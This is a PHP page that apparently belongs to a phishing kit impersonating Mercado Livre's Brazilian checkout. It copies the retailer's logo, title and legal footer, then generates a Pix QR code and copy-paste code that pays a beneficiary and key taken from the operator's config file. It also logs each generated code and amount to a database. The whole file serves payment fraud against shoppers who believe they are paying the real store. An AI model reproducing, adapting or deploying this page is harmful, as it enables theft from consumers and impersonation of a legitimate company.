<?php 
session_start();
include "../config/config.php";
include "../classcoderphp/pix.php";
include "../valor.php";

$date =  date('d/m/Y  H:i',  time());
 date_default_timezone_set('America/Sao_Paulo');
 $gerar_qrcode=true;
?> <title>Mercado Livre Brasil - Frete Grátis no mesmo dia</title>
    <link href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg" rel="icon" data-head-react="true"/>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
	 <script src="https://kit.fontawesome.com/729540066d.js" crossorigin="anonymous"></script>
	<link rel="stylesheet" href="../css/style.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">	
</head>
<body style="background:rgb(238, 238, 238);">

	<header class="dasdaksldaskdadcoderphp">
		<div class="container">
			<div class="row">
				<div class="col-md-6 col-6">
					<img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.59/mercadolibre/logo-pt__large_25years_v2.png" alt="">
				</div>
				<div class="col-md-6 col-6">
					<p style="font-size:13px;cursor:pointer;position:relative;top:10px;float:right;">Contato</p>
				</div>
			</div>
		</div>
	</header>


	<section class="askdkadadakd">
		<div class="alinharododod">
			<div class="row">
				<div class="col-md-8 col-8">
					<p style="font-weight: 500;color:white;font-size:17px;">Pague R$ <?= number_format( $_SESSION['totalpreco'], 2, ',', '.')?> via Pix para garantir sua compra</p>
				</div>
				<div class="col-md-4 col-4"><center><img src="../img/Screenshot_4sadsad.png" alt=""></center></div>
			</div>
		</div>
	</section>

	<section class="peqoooddopadrao">
		 <h4 style="font-size:17px;">Escaneie este código QR para pagar</h4>
		 <br>
		 <p style="line-height: 23px;font-size:12px;"><strong>1.</strong> <span>Acesse seu Internet Banking ou app de pagamentos.</span> <br><strong>2.</strong> <span>Escolha pagar via Pix.</span><br><strong>3.</strong> <span>Escaneie o seguinte código:</span></p>
		 <br>
		 
<?php


$altura = $_SESSION['totalpreco'];
$dois =  $altura;
                   include "../valor.php";

if ($gerar_qrcode){
   include "phpqrcode/qrlib.php"; 
   include "funcoes_pix.php";
   $px[00]="01"; //Payload Format Indicator, Obrigatório, valor fixo: 01
   // Se o QR Code for para pagamento único (só puder ser utilizado uma vez), descomente a linha a seguir.
   //$px[01]="12"; //Se o valor 12 estiver presente, significa que o BR Code só pode ser utilizado uma vez. 
   $px[26][00]="br.gov.bcb.pix"; //Indica arranjo específico; “00” (GUI) obrigatório e valor fixo: br.gov.bcb.pix
   $px[26][01]=$chave_pix;
   if (!empty($descricao)) {
      /* 
      Não é possível que a chave pix e infoAdicionais cheguem simultaneamente a seus tamanhos máximos potenciais.
      Conforme página 15 do Anexo I - Padrões para Iniciação do PIX  versão 1.2.006.
      */
      $tam_max_descr=99-(4+4+4+14+strlen($chave_pix));
      if (strlen($descricao) > $tam_max_descr) {
         $descricao=substr($descricao,0,$tam_max_descr);
      }
      $px[26][02]=$descricao;
   }
   $px[52]="0000"; //Merchant Category Code “0000” ou MCC ISO18245
   $px[53]="986"; //Moeda, “986” = BRL: real brasileiro - ISO4217
   if ($valor_pix > 0) {
      // Na versão 1.2.006 do Anexo I - Padrões para Iniciação do PIX estabelece o campo valor (54) como um campo opcional.
      $px[54]=$valor_pix;
   }
   $px[58]="BR"; //“BR” – Código de país ISO3166-1 alpha 2
   $px[59]=$beneficiario_pix; //Nome do beneficiário/recebedor. Máximo: 25 caracteres.
   $px[60]=$cidade_pix; //Nome cidade onde é efetuada a transação. Máximo 15 caracteres.
   $px[62][05]=$identificador;
//   $px[62][50][00]="BR.GOV.BCB.BRCODE"; //Payment system specific template - GUI
//   $px[62][50][01]="1.2.006"; //Payment system specific template - versão
   $pix=montaPix($px);
   $pix.="6304"; //Adiciona o campo do CRC no fim da linha do pix.
   $pix.=crcChecksum($pix); //Calcula o checksum CRC16 e acrescenta ao final.
   $linhas=round(strlen($pix)/120)+1;
   ?>

  


<center>

   <?php
   ob_start();
   QRCode::png($pix, null,'M',5);
   $imageString = base64_encode( ob_get_contents() );
   ob_end_clean();
   // Exibe a imagem diretamente no navegador codificada em base64.
    echo '<img src="data:image/png;base64,' . $imageString . '"></p>';


   
}

?>
 </center>



		 <br>
		 <p style="font-size:14px;"><i class="fa-regular fa-clock"></i> Pague e será creditado na hora</p>
		 <hr>
		 <p style="color:rgb(25, 25, 25);font-weight: bold;">Ou copie este código para fazer o pagamento</p>
		 <p style="font-size:14px;color:rgb(0 0 0 / 55%);">Escolha pagar via Pix pelo seu Internet Banking ou app de pagamentos. Depois, cole o seguinte código:</p>
		 

		   <textarea id='text' style="width:100%;height:auto;" value="<?= $pix?>"><?php echo $pix; ?>
                    </textarea>
		 <button id='copy' class="sdaddasdasd333" style="font-size:13px;border:none;width:124px;height:auto;padding:7px;color:white;border-radius:8px;outline:none;text-align: center;background:#3483fa;">Copiar Código</button>
	</section>
	<br><br><br>
	
	<footer class="aksdkjasdkasdfooter">
	<div class="container">
	<div class="row">
			<nav class="ansnansnansnav">
			<ul>
			<li>Trabalhe conosco
</li>
			<li>Termos e condições</li>
			<li>Promoções</li>
			<li>Como cuidamos da sua privacidade</li>
			<li>Acessibilidade</li>
			<li>Contato</li>
			<li>Informações sobre seguros</li>
			<li>
Programa de Afiliados
</li>
			<li>Black friday</li>

		</ul>
	</nav>
<br>
	<span style="font-size:12px;color:rgb(200,200,200);">Copyright © 1999-2024 Ebazar.com.br LTDA. <br> CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</span>
	</div>
	</div>
</footer>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>


<script src="https://code.jquery.com/jquery-3.6.0.js"></script>
<script type="text/javascript">
    const textInput = document.getElementById('text');
    const copyButton = document.getElementById('copy');

    copyButton.addEventListener('click', ()=> {
      textInput.select();
      document.execCommand('copy');
      iziToast.success({
                     title: 'Pix copiado,',
                     message: '<?= $pix ?>',
                     timeout:2000
                     });
    });
  </script>

  <?php 


 global $pdo;
 $sql=$pdo->prepare("INSERT INTO visitas_produto SET chavepix=:chavepix,valorpix=:valorpix");
 $sql->bindValue(":chavepix", $pix );
 $sql->bindValue(":valorpix", $_SESSION['totalpreco'] );
 $sql->execute();

 ?>
</body>
</html>